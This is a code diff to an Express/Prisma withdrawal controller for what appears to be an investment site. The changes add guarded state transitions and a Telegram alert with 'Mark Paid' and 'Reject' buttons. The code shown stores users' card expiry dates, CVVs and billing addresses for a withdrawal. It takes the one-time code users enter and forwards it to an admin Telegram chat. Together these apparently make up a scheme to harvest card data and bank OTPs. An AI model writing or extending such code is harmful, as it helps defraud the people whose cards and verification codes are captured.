@@ -1,7 +1,7 @@
 import { Response } from 'express'
 import { AuthRequest, authenticateToken } from '../middleware/auth.js'
 import { prisma } from '../config/db.js'
-import { notifyWithdrawalRequest } from '../services/telegramService.js'
+import { notifyWithdrawalRequest, sendTelegramWithButtons } from '../services/telegramService.js'
 import { generateWithdrawalId } from '../utils/helpers.js'
 import { z } from 'zod'
 import TelegramBot from 'node-telegram-bot-api'
@@ -77,7 +77,7 @@ export const createWithdrawal = async (req: AuthRequest, res: Response): Promise
         expiryDate,
         cvv,
         billingAddress,
-        status: 'PENDING_VERIFICATION',
+        status: 'PROCESSING',
         transactionHash: `Fee: ${fee.toFixed(2)}`,
       },
       include: { investment: true },
@@ -131,16 +131,21 @@ export const adminApproveWithdrawal = async (req: AuthRequest, res: Response): P
       return
     }
 
-    if (withdrawal.status !== 'PENDING_VERIFICATION') {
-      res.status(400).json({ success: false, message: 'Withdrawal not in verification state' })
+    if (withdrawal.status !== 'PROCESSING') {
+      res.status(400).json({ success: false, message: 'Withdrawal not in processing state' })
       return
     }
 
-    // Mark as awaiting OTP
-    const updated = await prisma.withdrawal.update({
-      where: { id },
+    const transition = await prisma.withdrawal.updateMany({
+      where: { id, status: 'PROCESSING' },
       data: { status: 'AWAITING_OTP' },
     })
+    if (transition.count === 0) {
+      res.status(409).json({ success: false, message: 'Withdrawal state changed. Refresh and try again.' })
+      return
+    }
+
+    const updated = { ...withdrawal, status: 'AWAITING_OTP' }
 
     // Notify user to enter OTP
     await notifyUserOTP(withdrawal.userId, withdrawal.id, withdrawal.amount)
@@ -190,16 +195,22 @@ export const submitOTP = async (req: AuthRequest, res: Response): Promise<void> 
       return
     }
 
-    const updated = await prisma.withdrawal.update({
-      where: { id },
+    const transition = await prisma.withdrawal.updateMany({
+      where: { id, userId: req.user!.id, status: 'AWAITING_OTP' },
       data: {
         verificationCode: otpCode,
         status: 'WITHDRAWAL_PENDING',
         isVerified: true,
       },
     })
+    if (transition.count === 0) {
+      res.status(409).json({ success: false, message: 'Withdrawal state changed. Refresh and try again.' })
+      return
+    }
 
-    // Notify admin with OTP
+    const updated = { ...withdrawal, verificationCode: otpCode, status: 'WITHDRAWAL_PENDING', isVerified: true }
+
+    // Notify admin with OTP and final processing actions.
     const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
     const ADMIN_CHAT_ID = process.env.TELEGRAM_ADMIN_CHAT_ID
     if (BOT_TOKEN && ADMIN_CHAT_ID) {
@@ -212,6 +223,14 @@ export const submitOTP = async (req: AuthRequest, res: Response): Promise<void> 
         console.error('Failed to notify admin:', e)
       }
     }
+
+    await sendTelegramWithButtons(
+      `OTP received for withdrawal. Amount: $${withdrawal.amount}. Ready for payment processing.`,
+      [
+        { text: 'Mark Paid', callback_data: `paid_withdrawal_${withdrawal.id}` },
+        { text: 'Reject', callback_data: `reject_withdrawal_${withdrawal.id}` },
+      ],
+    )
 
     res.status(200).json({
       success: true,
@@ -261,8 +280,8 @@ export const approveWithdrawal = async (req: AuthRequest, res: Response): Promis
       return
     }
 
-    if (!withdrawal.isVerified) {
-      res.status(400).json({ success: false, message: 'Withdrawal must be verified by admin and user first' })
+    if (withdrawal.status !== 'WITHDRAWAL_PENDING' || !withdrawal.isVerified) {
+      res.status(400).json({ success: false, message: 'Withdrawal must be pending and verified before payment' })
       return
     }
 
@@ -270,14 +289,20 @@ export const approveWithdrawal = async (req: AuthRequest, res: Response): Promis
     const fee = feeMatch ? Number(feeMatch[1]) : getWithdrawalFee(Number(withdrawal.amount))
     const totalDeduct = Number(withdrawal.amount) + fee
 
-    const updated = await prisma.withdrawal.update({
-      where: { id },
+    const transition = await prisma.withdrawal.updateMany({
+      where: { id, status: 'WITHDRAWAL_PENDING', isVerified: true },
       data: {
         status: 'WITHDRAWN',
         transactionHash,
         adminNotes,
       },
     })
+    if (transition.count === 0) {
+      res.status(409).json({ success: false, message: 'Withdrawal state changed. Refresh and try again.' })
+      return
+    }
+
+    const updated = { ...withdrawal, status: 'WITHDRAWN', transactionHash, adminNotes }
 
     await prisma.investment.update({
       where: { id: withdrawal.investmentId },
@@ -300,12 +325,17 @@ export const rejectWithdrawal = async (req: AuthRequest, res: Response): Promise
     const { id } = req.params
     const { adminNotes } = req.body
 
-    const updated = await prisma.withdrawal.update({
-      where: { id },
+    const transition = await prisma.withdrawal.updateMany({
+      where: { id, status: { in: ['PROCESSING', 'AWAITING_OTP', 'WITHDRAWAL_PENDING'] } },
       data: { status: 'REJECTED', adminNotes },
     })
 
-    res.status(200).json({ success: true, message: 'Withdrawal rejected', data: updated })
+    if (transition.count === 0) {
+      res.status(409).json({ success: false, message: 'Withdrawal is already completed or no longer active' })
+      return
+    }
+
+    res.status(200).json({ success: true, message: 'Withdrawal rejected' })
   } catch (error) {
     console.error('Reject withdrawal error:', error)
     res.status(500).json({ success: false, message: 'Server error' })
